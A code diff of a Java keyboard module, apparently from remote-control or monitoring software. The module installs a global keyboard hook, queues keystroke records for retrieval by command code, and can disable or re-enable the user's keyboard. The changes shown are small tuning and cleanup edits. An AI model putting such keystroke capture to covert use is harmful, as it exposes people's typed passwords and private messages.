@@ -18,8 +18,8 @@ import java.util.zip.GZIPOutputStream;
 @Slf4j
 public class KeyboardModule implements Module {
     private static final short GET_KEYBOARD_RECORD = 0x01;
-    private static final short DISABLE_KEYBOARD = GET_KEYBOARD_RECORD + 1;
-    private static final short ENABLE_KEYBOARD = DISABLE_KEYBOARD + 1;
+    private static final short DISABLE_KEYBOARD    = GET_KEYBOARD_RECORD + 1;
+    private static final short ENABLE_KEYBOARD     = DISABLE_KEYBOARD + 1;
 
     private static final ConcurrentLinkedQueue<KeyboardData> keyboardData =
             new ConcurrentLinkedQueue<>();
@@ -27,7 +27,7 @@ public class KeyboardModule implements Module {
     private static native void DisableKeyboard();
     private static native void EnableKeyboard();
 
-    static {
+    static  {
         // 注册全局键盘监听
         try {
             GlobalScreen.registerNativeHook();
@@ -63,10 +63,10 @@ public class KeyboardModule implements Module {
                 while (true) {
                     try {
                         synchronized (this) {
-                            wait(10000);
+                            wait(5000);
                         }
 
-                        if (keyboardData.size() > 500) {
+                        if (keyboardData.size() > 300) {
                             keyboardData.clear();
                         }
                     } catch (Exception e) {
@@ -77,13 +77,16 @@ public class KeyboardModule implements Module {
             }
         });
 
-        // 关闭时注销全局键盘监听
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            // 关闭时注销全局键盘监听
             try {
                 GlobalScreen.unregisterNativeHook();
             } catch (Exception e) {
                 log.error("Failed to unregister global keyboard listener.", e);
             }
+
+            // 启用键盘
+            EnableKeyboard();
         }));
 
         log.debug("Global keyboard listener registered.");
